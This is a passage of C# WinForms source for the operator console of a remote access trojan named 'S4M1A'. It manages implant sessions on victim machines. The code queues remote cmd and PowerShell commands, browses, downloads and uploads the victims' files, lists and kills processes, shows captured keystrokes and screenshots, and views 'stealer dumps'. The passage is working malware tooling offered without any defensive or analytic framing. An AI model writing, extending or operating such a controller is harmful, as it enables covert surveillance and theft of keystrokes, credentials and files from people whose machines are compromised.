                _procGrid.Rows[idx].Cells[2].Value = p[2].Trim();
            }
            AppendLog("ps -> " + _procGrid.Rows.Count + " process(es)");
        }

        private void HandleDownload(Session s, PendingOp op, CmdResult r, string data)
        {
            if (!r.Ok || data.TrimStart().StartsWith("ERR:"))
            {
                AppendConsole(s, "[-] Download failed: " + Truncate(data, 200), false);
                return;
            }
            try
            {
                byte[] bytes = Convert.FromBase64String(data.Trim());
                string name = (op.Arg ?? "").Trim().TrimEnd('\\', '/');
                name = Path.GetFileName(name);
                if (string.IsNullOrEmpty(name)) name = "file_" + r.Cid;
                string dir = Path.Combine(_cfg.DataDir, "downloads", s.Sid);
                Directory.CreateDirectory(dir);
                string file = Path.Combine(dir, name);
                File.WriteAllBytes(file, bytes);
                AppendConsole(s, "[+] Downloaded: " + file + " (" + bytes.Length + " bytes)", true);
            }
            catch (Exception ex)
            {
                AppendConsole(s, "[-] Failed to save file: " + ex.Message, false);
            }
        }

        private void HandleKeylog(Session s, CmdResult r, string data)
        {
            string text = data;
            if (!string.IsNullOrEmpty(data))
            {
                try
                {
                    byte[] raw = Convert.FromBase64String(data);
                    string dec = Encoding.UTF8.GetString(raw);
                    if (dec.IndexOf('\uFFFD') < 0) text = dec;
                }
                catch { }
            }
            AppendLog("Keylog flush: " + text.Length + " chars");
            if (text.Length > 0)
            {
                try
                {
                    CommandHandler.AppendKlog(s.Sid,
                        Convert.ToBase64String(Encoding.UTF8.GetBytes(text)));
                }
                catch { }
            }
            if (_tabMain.SelectedTab == _tabKeylog) RefreshKlog();
        }

        private void HandleText(Session s, CmdResult r, string data)
        {
            if (data.Length > MaxTextPopup && r.Ok)
            {
                TextViewerForm f = new TextViewerForm(data,
                    (s != null ? s.Host + " / " : "") +
                    (string.IsNullOrEmpty(r.Act) ? r.Cid : r.Act));
                f.Show(this);
                return;
            }
            AppendConsole(s, data, r.Ok);
        }

        // =================================================================
        //  Console tab
        // =================================================================
        private void ConsoleSend()
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            string text = _consoleIn.Text;
            if (text.Trim().Length == 0) return;
            _consoleIn.Text = "";
            bool ps = _consoleMode.SelectedIndex == 1;
            string cmd = ps ? "powershell" : "shell";
            AppendConsole(SessionStore.Find(sid), "> " + (ps ? "powershell " : "cmd ") + text, true);
            Send(sid, "text", cmd, text);
        }

        private void AppendConsole(Session s, string text, bool ok)
        {
            string head = "[" + DateTime.Now.ToString("HH:mm:ss") + "] ";
            if (s != null)
            {
                string shortSid = s.Sid;
                if (shortSid.Length > 8) shortSid = shortSid.Substring(0, 8);
                head += shortSid + " ";
            }
            if (!ok) head += "[!] ";

            _consoleOut.SelectionStart = _consoleOut.TextLength;
            _consoleOut.SelectionColor = ok ? Theme.Success : Theme.Danger;
            _consoleOut.AppendText(head);
            _consoleOut.SelectionColor = ok ? Theme.Text : Theme.Danger;
            _consoleOut.AppendText(text + "\r\n");
            _consoleOut.SelectionStart = _consoleOut.TextLength;
            _consoleOut.ScrollToCaret();
            CapText(_consoleOut, MaxConsoleChars);
        }

        private void AppendLog(string msg)
        {
            _logOut.SelectionStart = _logOut.TextLength;
            _logOut.SelectionColor = Theme.LogBlue;
            _logOut.AppendText("[" + DateTime.Now.ToString("HH:mm:ss") + "] " + msg + "\r\n");
            _logOut.SelectionStart = _logOut.TextLength;
            _logOut.ScrollToCaret();
            CapText(_logOut, MaxLogChars);
        }

        private static void CapText(RichTextBox box, int max)
        {
            if (box.TextLength <= max) return;
            box.Select(0, box.TextLength - max);
            box.SelectedText = "";
        }

        // =================================================================
        //  Files tab
        // =================================================================
        private void ShowFilesTab()
        {
            _tabMain.SelectTab(_tabFiles);
            RefreshFiles();
        }

        private void RefreshFiles()
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            _filePath.Text = GetCurPath(sid);
            Send(sid, "ls", "ls", GetCurPath(sid));
        }

        private void FileUp()
        {
            string sid = CurrentSid();
            if (sid == null) return;
            string p = ParentPath(GetCurPath(sid));
            _curPath[sid] = p;
            _filePath.Text = p;
            Send(sid, "ls", "ls", p);
        }

        private void FilePathGo()
        {
            string sid = CurrentSid();
            if (sid == null) return;
            string p = _filePath.Text.Trim();
            if (p.Length == 0) return;
            _curPath[sid] = p;
            Send(sid, "ls", "ls", p);
        }

        private void FileCd(DataGridViewRow row)
        {
            string sid = CurrentSid();
            if (sid == null) return;
            string name = row.Tag as string;
            if (string.IsNullOrEmpty(name)) return;
            string p = Combine(GetCurPath(sid), name);
            _curPath[sid] = p;
            _filePath.Text = p;
            Send(sid, "ls", "ls", p);
        }

        private void FileDownload()
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            DataGridViewRow row = SelectedFileRow();
            if (row == null) { StatusMsg("Select a file first"); return; }
            string name = row.Tag as string;
            if (string.IsNullOrEmpty(name)) return;
            string remote = Combine(GetCurPath(sid), name);
            Send(sid, "download", "download", remote);
        }

        private void FileUpload()
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select a file to upload";
                ofd.Filter = "All files (*.*)|*.*";
                if (ofd.ShowDialog(this) != DialogResult.OK) return;
                FileInfo fi = new FileInfo(ofd.FileName);
                if (fi.Length > MaxUploadBytes)
                {
                    MessageBox.Show(this, "File exceeds 10MB (implant upload limit).",
                                    "S4M1A", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
                string target = PromptDialog.Show(this,
                    "Target path on the victim machine:",
                    Combine(GetCurPath(sid), fi.Name));
                if (target == null) return;
                string b64 = Convert.ToBase64String(File.ReadAllBytes(ofd.FileName));
                Send(sid, "text", "upload", CommandHandler.UploadArgs(target, b64));
            }
        }

        private void FileView()
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            DataGridViewRow row = SelectedFileRow();
            if (row == null) { StatusMsg("Select a file first"); return; }
            string name = row.Tag as string;
            if (string.IsNullOrEmpty(name)) return;
            string remote = Combine(GetCurPath(sid), name);
            Send(sid, "text", "cat", remote);
            _tabMain.SelectTab(_tabConsole);
        }

        private DataGridViewRow SelectedFileRow()
        {
            if (_fileGrid.SelectedRows.Count == 0) return null;
            return _fileGrid.SelectedRows[0];
        }

        // =================================================================
        //  Processes tab
        // =================================================================
        private void ShowProcsTab()
        {
            _tabMain.SelectTab(_tabProcs);
            RefreshProcs();
        }

        private void RefreshProcs()
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            Send(sid, "ps", "ps", "");
        }

        private void ProcKillClick(object sender, EventArgs e)
        {
            string pid = PromptDialog.Show(this, "PID of the process to kill:", "");
            if (string.IsNullOrEmpty(pid)) return;
            KillPid(pid.Trim());
        }

        private void KillPid(string pid)
        {
            string sid = CurrentSid();
            if (sid == null) return;
            Send(sid, "text", "kill", pid);
        }

        // =================================================================
        //  Keylog tab
        // =================================================================
        private void ShowKeylogTab()
        {
            _tabMain.SelectTab(_tabKeylog);
            RefreshKlog();
        }

        private void RefreshKlog()
        {
            if (string.IsNullOrEmpty(_currentSid)) return;
            string text = CommandHandler.GetKlog(_currentSid);
            if (text.Length > MaxKlogChars)
                text = text.Substring(text.Length - MaxKlogChars);
            if (text.Length == 0) text = "(no keystrokes captured yet)";
            if (_klogOut.Text != text)
            {
                _klogOut.Text = text;
                _klogOut.SelectionStart = _klogOut.TextLength;
                _klogOut.ScrollToCaret();
            }
        }

        // =================================================================
        //  Info tab
        // =================================================================
        private void ShowInfoTab()
        {
            _tabMain.SelectTab(_tabInfo);
            RefreshInfoTab();
        }

        private void RefreshInfoTab()
        {
            Session s = string.IsNullOrEmpty(_currentSid) ? null : SessionStore.Find(_currentSid);
            if (s == null)
            {
                foreach (Label l in _info.Values) l.Text = "—";
                return;
            }
            _info["SID"].Text = s.Sid;
            _info["Implant"].Text = s.ImplantId ?? "";
            _info["Group"].Text = s.Group ?? "";
            _info["Host"].Text = s.Host ?? "";
            _info["User"].Text = s.User ?? "";
            _info["OS"].Text = s.Os ?? "";
            _info["Architecture"].Text = s.Arch ?? "";
            _info["PID"].Text = s.Pid.ToString();
            _info["Uptime"].Text = FmtUptime(s.UptimeSec);
            _info["IP"].Text = s.Ip ?? "";
            _info["Alias"].Text = s.Alias ?? "";
            _info["First Seen"].Text = s.FirstSeenUtc.ToString("yyyy-MM-dd HH:mm:ss");
            _info["Last Seen"].Text = s.LastSeenUtc.ToString("yyyy-MM-dd HH:mm:ss");
            _info["Status"].Text = s.IsAlive(_cfg.DeadHours) ? "Alive" : "Dead";
            _info["Pending Commands"].Text = (s.Queue != null ? s.Queue.Count : 0).ToString();
        }

        private static string FmtUptime(long sec)
        {
            TimeSpan t = TimeSpan.FromSeconds(sec);
            if (t.TotalDays >= 1) return ((int)t.TotalDays) + "d " + t.Hours + "h " + t.Minutes + "m";
            if (t.TotalHours >= 1) return t.Hours + "h " + t.Minutes + "m";
            return t.Minutes + "m " + t.Seconds + "s";
        }

        // =================================================================
        //  Toolbar actions
        // =================================================================
        private void KillClick(object sender, EventArgs e)
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            if (MessageBox.Show(this,
                    "Send kill switch command to session " + ShortSid(sid) + "?\n" +
                    "The implant will self-terminate on its next beacon.",
                    "S4M1A - Kill", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes)
                return;
            string cid = CommandHandler.EnqueueKill(sid);
            AppendLog("Kill switch queued -> " + sid + " (" + cid + ")");
            StatusMsg("Kill switch sent -> " + ShortSid(sid));
        }

        private void UninstallClick(object sender, EventArgs e)
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            if (MessageBox.Show(this,
                    "Uninstall implant on " + ShortSid(sid) + "?",
                    "S4M1A - Uninstall",
                    MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes)
                return;
            Send(sid, "text", "uninstall", "");
        }

        private void SleepClick(object sender, EventArgs e)
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return; }
            string ms = PromptDialog.Show(this,
                "Sleep interval in milliseconds (1000 - 3600000):", "5000");
            if (string.IsNullOrEmpty(ms)) return;
            ms = ms.Trim();
            int v;
            if (!int.TryParse(ms, out v))
            {
                StatusMsg("Invalid value");
                return;
            }
            Send(sid, "text", "sleep", CommandHandler.SleepArgs(v));
        }

        private void PurgeClick(object sender, EventArgs e)
        {
            if (MessageBox.Show(this,
                    "Delete all dead sessions (older than " + _cfg.DeadHours + " hours)?",
                    "S4M1A - Purge", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes)
                return;
            int before = SessionStore.All().Count;
            CommandHandler.PurgeDead(_cfg.DeadHours);
            int after = SessionStore.All().Count;
            StatusMsg("Purged " + (before - after) + " dead session(s)");
            AppendLog("Purge: removed " + (before - after) + " dead session(s)");
            RefreshSessions();
        }

        // =================================================================
        //  Command helpers
        // =================================================================
        private string Send(string sid, string kind, string cmd, string args)
        {
            string cid = CommandHandler.Enqueue(sid, cmd, args);
            _pending.Add(new PendingOp
            {
                Sid = sid, Cid = cid, Kind = kind, Arg = args, When = DateTime.UtcNow
            });
            AppendLog("Command queued: " + cmd + " -> " + sid + " (" + cid + ")");
            return cid;
        }

        private string SendCurrent(string kind, string cmd, string args)
        {
            string sid = CurrentSid();
            if (sid == null) { StatusMsg("Select a session first"); return null; }
            return Send(sid, kind, cmd, args);
        }

        private string CurrentSid()
        {
            if (!string.IsNullOrEmpty(_currentSid) && SessionStore.Find(_currentSid) != null)
                return _currentSid;
            if (_grid.SelectedRows.Count > 0)
            {
                string s = _grid.SelectedRows[0].Tag as string;
                if (!string.IsNullOrEmpty(s)) { _currentSid = s; return s; }
            }
            if (_grid.Rows.Count > 0)
            {
                string s = _grid.Rows[0].Tag as string;
                if (!string.IsNullOrEmpty(s)) { _currentSid = s; return s; }
            }
            return null;
        }

        private void StatusMsg(string msg)
        {
            _stInfo.Text = msg;
        }

        private void OnTabChanged()
        {
            if (_tabMain.SelectedTab == _tabFiles && CurrentSid() != null)
                _filePath.Text = GetCurPath(CurrentSid());
            if (_tabMain.SelectedTab == _tabKeylog) RefreshKlog();
            if (_tabMain.SelectedTab == _tabInfo) RefreshInfoTab();
        }

        private string GetCurPath(string sid)
        {
            if (!_curPath.ContainsKey(sid)) _curPath[sid] = "~";
            return _curPath[sid];
        }

        private static string Combine(string dir, string name)
        {
            if (string.IsNullOrEmpty(dir)) return name;
            if (dir == "~") return "~\\" + name;
            if (dir.EndsWith("\\") || dir.EndsWith("/")) return dir + name;
            return dir + "\\" + name;
        }

        private static string ParentPath(string p)
        {
            if (string.IsNullOrEmpty(p) || p == "~") return "~";
            string t = p.TrimEnd('\\', '/');
            if (t == "~") return "~";
            if (t.Length >= 2 && t[1] == ':')
            {
                if (t.Length == 2) return t + "\\";
                if (t.Length == 3) return t.Substring(0, 2) + "\\";
            }
            int i = t.LastIndexOfAny(new char[] { '\\', '/' });
            if (i < 0) return "~";
            string parent = t.Substring(0, i);
            if (parent.Length == 2 && parent[1] == ':') return parent + "\\";
            if (parent.Length == 0) return "~";
            return parent;
        }

        private static string ShortSid(string sid)
        {
            if (string.IsNullOrEmpty(sid)) return "";
            if (sid.Length <= 12) return sid;
            return sid.Substring(0, 12) + "…";
        }

        private static string Truncate(string s, int max)
        {
            if (string.IsNullOrEmpty(s) || s.Length <= max) return s ?? "";
            return s.Substring(0, max) + "…";
        }

        private static string Conv(Dictionary<string, object> d, string key)
        {
            object v;
            if (d.TryGetValue(key, out v) && v != null) return Convert.ToString(v);
            return "";
        }

        private static DataGridViewRow FindRow(DataGridView g, string sid)
        {
            foreach (DataGridViewRow r in g.Rows)
                if (r.Tag as string == sid) return r;
            return null;
        }

        // =================================================================
        //  Widget factories
        // =================================================================
        private static TabPage NewTab(string title)
        {
            TabPage tp = new TabPage(title);
            tp.BackColor = Theme.Bg;
            tp.ForeColor = Theme.Text;
            tp.Padding = new Padding(4);
            return tp;
        }

        private static DataGridView MkGrid(string[] headers, int[] widths)
        {
            DataGridView g = new DataGridView();
            g.Dock = DockStyle.Fill;
            g.BackgroundColor = Theme.Bg;
            g.BorderStyle = BorderStyle.None;
            g.CellBorderStyle = DataGridViewCellBorderStyle.SingleHorizontal;
            g.GridColor = Theme.Border;
            g.RowHeadersVisible = false;
            g.AllowUserToAddRows = false;
            g.AllowUserToDeleteRows = false;
            g.AllowUserToResizeRows = false;
            g.MultiSelect = false;
            g.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            g.ReadOnly = true;
            g.AutoGenerateColumns = false;
            g.EnableHeadersVisualStyles = false;
            g.ColumnHeadersDefaultCellStyle.BackColor = Theme.Header;
            g.ColumnHeadersDefaultCellStyle.ForeColor = Color.FromArgb(205, 210, 218);
            g.ColumnHeadersDefaultCellStyle.Font = Theme.UiBold;
            g.ColumnHeadersHeight = 28;
            g.DefaultCellStyle.BackColor = Theme.Bg;
            g.DefaultCellStyle.ForeColor = Theme.Text;
            g.DefaultCellStyle.Font = Theme.UiFont;
            g.DefaultCellStyle.SelectionBackColor = Theme.Accent;
            g.DefaultCellStyle.SelectionForeColor = Color.White;
            g.AlternatingRowsDefaultCellStyle.BackColor = Theme.GridAlt;
            g.RowTemplate.Height = 24;
            EnableDoubleBuffer(g);
            for (int i = 0; i < headers.Length; i++)
                g.Columns.Add(MkCol(headers[i], widths[i]));
            return g;
        }

        private static DataGridViewTextBoxColumn MkCol(string header, int width)
        {
            DataGridViewTextBoxColumn c = new DataGridViewTextBoxColumn();
            c.HeaderText = header;
            c.Width = width;
            c.SortMode = DataGridViewColumnSortMode.NotSortable;
            return c;
        }

        private static Button MkBtn(string text, int width, EventHandler onClick, Color? back)
        {
            Color baseColor = back.HasValue ? back.Value : Color.FromArgb(44, 48, 56);
            Button b = new Button();
            b.Text = text;
            b.Width = width;
            b.Height = 32;
            b.Margin = new Padding(0, 0, 6, 0);
            b.FlatStyle = FlatStyle.Flat;
            b.FlatAppearance.BorderSize = 0;
            b.FlatAppearance.MouseDownBackColor = ControlPaint.Dark(baseColor);
            b.FlatAppearance.MouseOverBackColor =
                back.HasValue ? ControlPaint.Light(back.Value) : Color.FromArgb(58, 63, 72);
            b.BackColor = baseColor;
            b.ForeColor = Color.White;
            b.Font = Theme.UiFont;
            b.UseVisualStyleBackColor = false;
            b.Cursor = Cursors.Hand;
            if (onClick != null) b.Click += onClick;
            return b;
        }

        private static Label AddInfoRow(TableLayoutPanel tlp, int row, string label)
        {
            Label k = new Label();
            k.Text = label;
            k.ForeColor = Theme.Dim;
            k.Font = Theme.UiBold;
            k.Dock = DockStyle.Fill;
            k.TextAlign = ContentAlignment.MiddleLeft;
            k.Padding = new Padding(8, 2, 8, 2);

            Label v = new Label();
            v.ForeColor = Theme.Text;
            v.Font = Theme.UiFont;
            v.Dock = DockStyle.Fill;
            v.TextAlign = ContentAlignment.MiddleLeft;
            v.Padding = new Padding(8, 2, 8, 2);
            v.AutoEllipsis = true;

            tlp.Controls.Add(k, 0, row);
            tlp.Controls.Add(v, 1, row);
            return v;
        }

        // =================================================================
        //  Owner-drawn tabs (flat professional look)
        // =================================================================
        private static void StyleTabs(TabControl tc)
        {
            tc.DrawMode = TabDrawMode.OwnerDrawFixed;
            tc.SizeMode = TabSizeMode.Fixed;
            tc.ItemSize = new Size(112, 30);
            tc.DrawItem += DrawTabItem;
        }

        private static void DrawTabItem(object sender, DrawItemEventArgs e)
        {
            TabControl tc = (TabControl)sender;
            if (e.Index < 0 || e.Index >= tc.TabPages.Count) return;
            TabPage page = tc.TabPages[e.Index];
            bool sel = e.Index == tc.SelectedIndex;

            using (SolidBrush bg = new SolidBrush(sel ? Theme.Panel : Theme.Bg))
                e.Graphics.FillRectangle(bg, e.Bounds);

            if (sel)
            {
                using (SolidBrush acc = new SolidBrush(Theme.Accent))
                    e.Graphics.FillRectangle(acc, e.Bounds.X + 2, e.Bounds.Bottom - 2,
                                             e.Bounds.Width - 4, 2);
            }

            TextRenderer.DrawText(e.Graphics, page.Text,
                sel ? Theme.UiBold : Theme.UiFont,
                new Rectangle(e.Bounds.X + 4, e.Bounds.Y + 2,
                              e.Bounds.Width - 8, e.Bounds.Height - 4),
                sel ? Theme.Text : Theme.Dim,
                TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter |
                TextFormatFlags.EndEllipsis);
        }

        private static void EnableDoubleBuffer(Control c)
        {
            try
            {
                typeof(Control).GetProperty("DoubleBuffered",
                    System.Reflection.BindingFlags.Instance |
                    System.Reflection.BindingFlags.NonPublic).SetValue(c, true, null);
            }
            catch { }
        }
    }

    // =====================================================================
    //  ImageViewerForm - shows a screenshot
    // =====================================================================
    internal sealed class ImageViewerForm : Form
    {
        public ImageViewerForm(Image img, string title)
        {
            Text = "S4M1A - Screenshot / " + title;
            BackColor = Color.FromArgb(20, 20, 20);
            StartPosition = FormStartPosition.CenterScreen;
            int w = Math.Min(Math.Max(img.Width, 320), 1600);
            int h = Math.Min(Math.Max(img.Height, 240), 1000);
            ClientSize = new Size(w + 24, h + 48);
            MinimizeBox = false;
            ShowInTaskbar = true;

            PictureBox pb = new PictureBox();
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.Zoom;
            pb.Image = img;
            pb.BackColor = Color.FromArgb(20, 20, 20);
            Controls.Add(pb);

            FormClosed += delegate { img.Dispose(); };
        }
    }

    // =====================================================================
    //  TextViewerForm - large text output (shell/stealer dumps)
    // =====================================================================
    internal sealed class TextViewerForm : Form
    {
        public TextViewerForm(string text, string title)
        {
            Text = "S4M1A - " + title;
            BackColor = Theme.Bg;
            StartPosition = FormStartPosition.CenterScreen;
            ClientSize = new Size(760, 520);
            MinimumSize = new Size(480, 320);

            TextBox tb = new TextBox();
            tb.Dock = DockStyle.Fill;
            tb.Multiline = true;
            tb.ReadOnly = true;
            tb.ScrollBars = ScrollBars.Both;
            tb.WordWrap = false;
            tb.Font = Theme.Mono;
            tb.BackColor = Theme.Input;
            tb.ForeColor = Theme.Text;
            tb.BorderStyle = BorderStyle.None;
            tb.Text = text;
            tb.SelectionStart = 0;
            tb.SelectionLength = 0;
            Controls.Add(tb);
        }
    }

    // =====================================================================
    //  PromptDialog - single-input modal dialog
    // =====================================================================
    internal sealed class PromptDialog : Form
    {
        private readonly TextBox _input;

        private PromptDialog(string title, string prompt, string def)
        {
            Text = "S4M1A - " + title;
            BackColor = Theme.Bg;
            ForeColor = Theme.Text;
            Font = Theme.UiFont;
            FormBorderStyle = FormBorderStyle.FixedDialog;
            StartPosition = FormStartPosition.CenterParent;
            ClientSize = new Size(440, 136);
            MaximizeBox = false;
            MinimizeBox = false;

            Label lbl = new Label();
            lbl.Text = prompt;
            lbl.Location = new Point(14, 12);
            lbl.Size = new Size(412, 22);
            lbl.ForeColor = Theme.Text;

            _input = new TextBox();
            _input.Location = new Point(14, 42);
            _input.Size = new Size(412, 26);
            _input.BackColor = Theme.Input;
            _input.ForeColor = Theme.Text;
            _input.BorderStyle = BorderStyle.FixedSingle;
            _input.Text = def ?? "";

            Button ok = MkB("OK", Theme.Accent, DialogResult.OK);
            ok.Location = new Point(226, 86);
            Button cancel = MkB("Cancel", Color.FromArgb(48, 48, 48), DialogResult.Cancel);
            cancel.Location = new Point(330, 86);

            AcceptButton = ok;
            CancelButton = cancel;

            Controls.Add(lbl);
            Controls.Add(_input);
            Controls.Add(ok);
            Controls.Add(cancel);

            _input.Select();
            _input.SelectionStart = _input.TextLength;
        }

        private static Button MkB(string text, Color back, DialogResult dr)
        {
            Button b = new Button();
            b.Text = text;
            b.Size = new Size(100, 34);
            b.DialogResult = dr;
            b.FlatStyle = FlatStyle.Flat;
            b.FlatAppearance.BorderSize = 0;
            b.BackColor = back;
            b.ForeColor = Color.White;
            b.Font = Theme.UiFont;
            b.UseVisualStyleBackColor = false;
            b.Cursor = Cursors.Hand;
            return b;
        }

        public static string Show(IWin32Window owner, string prompt, string def)
        {
            using (PromptDialog dlg = new PromptDialog("Input", prompt, def))
            {
                if (dlg.ShowDialog(owner) != DialogResult.OK) return null;
                return dlg._input.Text;
            }
        }
    }
}
